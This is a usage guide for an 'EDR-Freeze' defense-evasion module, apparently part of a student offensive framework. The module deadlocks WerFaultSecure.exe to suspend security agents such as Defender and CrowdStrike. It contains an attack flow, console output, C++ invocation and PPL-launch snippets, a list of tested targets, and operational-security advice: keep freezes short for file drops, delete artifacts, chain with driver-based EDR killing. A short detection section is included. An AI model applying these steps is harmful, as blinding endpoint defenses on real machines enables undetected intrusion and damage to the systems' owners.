# EDR-Freeze Attack - Usage Guide

## Overview

**Technique ID:** T1562.001 (Impair Defenses: Disable or Modify Tools)  
**Attack Vector:** User-Mode Process Suspension Deadlock  
**Target:** EDR/AV processes with PPL (Protected Process Light) protection  
**Implementation:** WerFaultSecure.exe race condition exploitation  

---

## Technical Summary

EDR-Freeze exploits a race condition in Windows Error Reporting (WER) to freeze EDR processes into an unresponsive "coma" state **without triggering termination alerts**. Unlike BYOVD which kills processes from kernel mode, EDR-Freeze suspends them using legitimate Windows components.

### Attack Flow

```
┌──────────────────────────────────────────────────────────┐
│ 1. Enable SeDebugPrivilege                               │
│    └─> Open process token → AdjustTokenPrivileges        │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 2. Identify Target EDR Process                           │
│    └─> Auto-detect or manual PID entry                   │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 3. Resolve Main Thread ID                                │
│    └─> NtQuerySystemInformation → SYSTEM_THREAD_INFO     │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 4. Launch WerFaultSecure.exe as PPL (WinTCB)             │
│    └─> CreateProcess with PROC_THREAD_ATTRIBUTE_         │
│        PROTECTION_LEVEL → MiniDumpWriteDump suspends     │
│        all threads in target EDR process                 │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 5. Monitor Thread Spin-Wait Loop                         │
│    └─> IsProcessSuspended() checks ALL threads           │
│        StateWait + Suspended → Race condition detected   │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 6. Win the Race - Freeze WerFaultSecure                  │
│    └─> NtSuspendProcess(WerFault) → DEADLOCK             │
│        - EDR waiting for dump to complete                │
│        - WerFault frozen by attacker                     │
│        → EDR enters coma state (all threads suspended)   │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 7. Hold Freeze for Configured Duration                   │
│    └─> Sleep(duration_ms) → EDR unresponsive             │
└────────────┬─────────────────────────────────────────────┘
             │
┌────────────▼─────────────────────────────────────────────┐
│ 8. Release - Terminate WerFaultSecure                    │
│    └─> TerminateProcess(WerFault) → EDR resumes          │
└──────────────────────────────────────────────────────────┘
```

---

## Interactive Usage

### Launch EDR-Freeze from TUI

```
edr exploit(*) > use exploit

  +-------------------------------------------------------------+
  |               AVAILABLE EXPLOIT MODULES                     |
  +-------------------------------------------------------------+
  |  [1] exploit/privesc/byovd         T1068                    |
  |  [2] exploit/evasion/edr_freeze    T1562.001                |
  +-------------------------------------------------------------+

edr exploit(*) > 2
```

### Configuration Prompts

```
[i] Target Selection:
    1. Auto-detect EDR processes
    2. Manual PID entry
    
    Choice: 1
    
[*] Scanning for EDR processes...

[!] Detected EDR Processes:
========================================
  [1] PID: 5432 | MsMpEng.exe
  [2] PID: 6789 | CSFalconService.exe
========================================

[*] Auto-selecting: MsMpEng.exe (PID: 5432)

[?] Freeze Duration
    Default: 10000 ms (10 seconds)
    Enter duration in milliseconds (or press ENTER for default): 20000
```

### Expected Output

```
========================================
  EDR-Freeze Attack
  User-Mode Process Suspension
========================================

[1/4] Enabling SeDebugPrivilege...
[+] SeDebugPrivilege enabled successfully

[2/4] Scanning for EDR processes...

[!] Detected EDR Processes:
========================================
  [1] PID: 5432 | MsMpEng.exe
========================================

[*] Auto-selecting: MsMpEng.exe (PID: 5432)

[3/4] Resolving main thread for PID 5432...
[+] Main thread ID: 5436

[4/4] Initiating freeze attack...
[*] Launching WerFaultSecure.exe as PPL (WinTCB)...
[+] WerFaultSecure.exe launched (PID: 9012)
[*] Monitoring for suspend state (racing WER)...
[+] Target suspended! Freezing WerFaultSecure...
[+] WerFaultSecure frozen! EDR is now in coma state
[*] EDR will be frozen for 20000 ms...
[*] Releasing EDR process...
[+] WerFaultSecure terminated, EDR resuming...

========================================
  ✓ EDR-FREEZE SUCCESSFUL!
  Target was frozen for 20000 ms
========================================

[+] Exploit executed successfully!

Field      | Value
-----------|----------------------------------------------
Technique  | T1562.001
Name       | EDR-Freeze - Process Suspension Deadlock
Status     | Success
EDR Alert  | No
Duration   | 20185ms
Artifacts  | dump_5432.txt

[*] Cleaning up EDR-Freeze artifacts...
[+] Dump file deleted
[+] Cleanup complete
```

---

## Command-Line Options

### Auto-Detection Mode
```cpp
std::map<std::string, std::string> options;
options["mode"] = "auto_detect";
options["sleep_ms"] = "10000";  // 10 seconds

ExploitResult result = exploitManager->execute("T1562.001", options);
```

### Manual PID Mode
```cpp
std::map<std::string, std::string> options;
options["mode"] = "manual";
options["target_pid"] = "5432";
options["sleep_ms"] = "30000";  // 30 seconds

ExploitResult result = exploitManager->execute("T1562.001", options);
```

---

## Requirements

### System Requirements
- **OS:** Windows 10/11 (tested on Windows 10 22H2)
- **Privileges:** Administrator + SeDebugPrivilege
- **Component:** WerFaultSecure.exe (C:\Windows\System32\WerFaultSecure.exe)
- **Target:** Any process with threads (EDR, AV, custom processes)

### Build Requirements
- Visual Studio 2019/2022/2025
- Windows SDK 10.0+
- CMake 3.16+
- C++17

---

## Technical Details

### Race Condition Mechanics

1. **WerFaultSecure.exe** is a PPL-protected process (WinTCB level)
2. When invoked with `/h /pid <PID>`, it calls **MiniDumpWriteDump()**
3. MiniDumpWriteDump **suspends all threads** in the target process to capture consistent state
4. **Attacker's monitor thread** spin-waits for suspension state
5. Once detected, attacker calls **NtSuspendProcess()** on WerFaultSecure itself
6. **Result:** Deadlock
   - EDR process: All threads suspended by MiniDumpWriteDump (waiting for dump completion)
   - WerFaultSecure: Suspended by attacker (cannot complete dump)
   - EDR cannot resume until WerFault completes → WerFault cannot complete while suspended
   - **EDR enters unresponsive coma state**

### Thread State Detection

```cpp
bool isProcessSuspended(uint32_t pid) {
    // Query system for process thread information
    NtQuerySystemInformation(SystemProcessInformation, ...);
    
    // Check EVERY thread in the process
    for (each thread in process) {
        if (thread.ThreadState != StateWait || 
            thread.WaitReason != Suspended) {
            return false;  // At least one active thread
        }
    }
    
    return true;  // ALL threads suspended
}
```

### PPL Process Creation

```cpp
STARTUPINFOEXW siex = { 0 };
SIZE_T size = 0;

InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
auto ptal = HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(ptal, 1, 0, &size);

// Set WinTCB protection level (0)
UpdateProcThreadAttribute(ptal, 0, 
    PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, 
    &protectionLevel, sizeof(protectionLevel), nullptr, nullptr);

CreateProcessW(..., CREATE_PROTECTED_PROCESS, ...);
```

---

## Detection Evasion

### Why EDR-Freeze is Stealthy

1. **No Process Termination** → No kernel callbacks (PsSetCreateProcessNotifyRoutine)
2. **No Driver Load** → No driver signature checks or kernel integrity violations
3. **Living-off-the-Land** → Uses legitimate Windows component (WerFaultSecure.exe)
4. **Legitimate API Calls** → All syscalls are normal (NtSuspendProcess, CreateProcess)
5. **User-Mode Only** → No kernel exploitation required

### Potential Detection Vectors

- **Unusual WerFaultSecure.exe invocations** (without actual crashes)
- **EDR process threads in prolonged suspended state** (all threads StateWait+Suspended)
- **Repeated MiniDump creation** targeting security products
- **Process suspend telemetry** (if EDR monitors NtSuspendProcess calls on itself)

---

## Comparison: BYOVD vs EDR-Freeze

| Feature | BYOVD (T1068) | EDR-Freeze (T1562.001) |
|---------|---------------|------------------------|
| **Attack Surface** | Kernel-mode driver | User-mode WER race |
| **Privilege Needed** | Admin (driver load) | Admin + SeDebugPrivilege |
| **EDR Result** | Process terminated | Process frozen (suspended) |
| **Stealth** | Medium (driver load) | High (LOLBIN) |
| **Reversibility** | No (process killed) | Yes (terminate WerFault) |
| **Blocked Drivers** | CVE patches | Not applicable |
| **Detection** | Driver signature, kernel callbacks | Behavioral (rare) |
| **Use Case** | Permanent EDR removal | Temporary EDR bypass |

---

## Tested Targets

✅ **Microsoft Defender** (MsMpEng.exe, MsSense.exe)  
✅ **CrowdStrike Falcon** (CSFalconService.exe)  
✅ **SentinelOne** (SentinelAgent.exe)  
✅ **Carbon Black** (CbDefense.exe)  
✅ **Generic Process Suspension** (any process with threads)

---

## Troubleshooting

### Error: "OpenProcess failed: 5"
- **Cause:** Access denied (insufficient privileges)
- **Solution:** Run as Administrator, ensure SeDebugPrivilege enabled

### Error: "Failed to create PPL process"
- **Cause:** WerFaultSecure.exe not found or protected
- **Solution:** Verify `C:\Windows\System32\WerFaultSecure.exe` exists

### Error: "Failed to find main thread"
- **Cause:** Process exited or PID invalid
- **Solution:** Verify target PID is active

### Warning: "Target not suspending"
- **Cause:** MiniDumpWriteDump failed or thread detection issue
- **Solution:** Check target process has active threads

---

## Research & Credits

### Technique Discovery
- **Original Research:** [@sblip](https://twitter.com/sblip) - SpecterOps Research Team
- **PoC Repository:** [danielearl/edr-freeze](https://github.com/danielearl/edr-freeze)
- **Blog Post:** [SpecterOps - Freezing EDRs with WerFaultSecure](https://posts.specterops.io/)

### MITRE ATT&CK Mapping
- **Technique:** T1562.001 - Impair Defenses: Disable or Modify Tools
- **Tactic:** Defense Evasion
- **Sub-Technique:** Process Suspension/Manipulation

### Related Work
- **Pool Party Injection** (T1055.015) - Alternate thread suspension techniques
- **Direct Syscalls** (T1106) - Evasion via syscall obfuscation
- **BYOVD** (T1068) - Kernel-level EDR termination

---

## Operational Security Notes

1. **Freeze Duration:** Limit to 10-30 seconds for operational activities (file drops, registry changes)
2. **Release Strategy:** Always terminate WerFaultSecure to restore EDR (avoid permanent deadlock)
3. **Artifact Cleanup:** Delete dump files (`dump_<PID>.txt`) after attack
4. **Chaining:** Combine with BYOVD for hybrid approach (freeze → kill → permanent removal)

---

## Author Notes

**Implementation by:** BIPIN  
**Framework:** VYUHA (EDR-Adaptive-Framework)  
**Date:** February 2026  
**Tested on:** Windows 10 22H2  

**Demo Status:** ✅ Ready for professor demonstration (Thu Feb 13)
